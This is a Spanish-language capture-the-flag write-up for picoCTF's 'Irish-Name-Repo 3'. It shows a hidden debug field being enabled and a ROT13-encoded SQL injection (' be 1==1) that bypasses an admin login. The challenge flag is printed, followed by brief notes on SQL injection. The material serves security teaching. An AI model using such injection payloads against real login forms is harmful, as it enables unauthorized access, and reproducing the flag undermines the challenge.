# Irish-Name-Repo 3

## Objetivo 
Descripción:
Hay un sitio web seguro en `https://jupiter.challenges.picoctf.org/problem/40742/`( [enlace](https://jupiter.challenges.picoctf.org/problem/40742/) ) o http://jupiter.challenges.picoctf.org:40742. ¡Intenta ver si puedes iniciar sesión como administrador!

Sugerencias:
Parece que la contraseña está encriptada.

## Solución
``` shell
//Nos dirijimos al enlace ( [enlace](https://jupiter.challenges.picoctf.org/problem/40742/))

//nos vamos al login y vemos el codigo fuente

//aqui podemos ver su codigo y vemos que tiene un //valor oculto <input type="hidden" name="debug" value="0">

//cambiamos ese valor por 1 en el inspector

//solo tenemos el puro password
//intentamos poner la inyeccion ' or 1==1;
//'

//vemos que nos cambia el or por  be

password: ' or 1==1
SQL query: SELECT * FROM admin where password = '' be 1==1'

//vemos que la encriptasion esta en rot13
//lo que podemos hacer ahora es poner ' be 1==1
//'
//esto para que la encriptasion nos pase a or
//y asi obtenemos la bandera

password: ' be 1==1;
SQL query: SELECT * FROM admin where password = '' or 1==1;'

Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}

```

## Notas
La inyección SQL es una técnica de inyección de código que podría destruir su base de datos.

La inyección SQL es una de las técnicas de piratería web más comunes.

La inyección SQL es la colocación de código malicioso en declaraciones SQL, a través de la entrada de una página web.

## Referencias
[SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)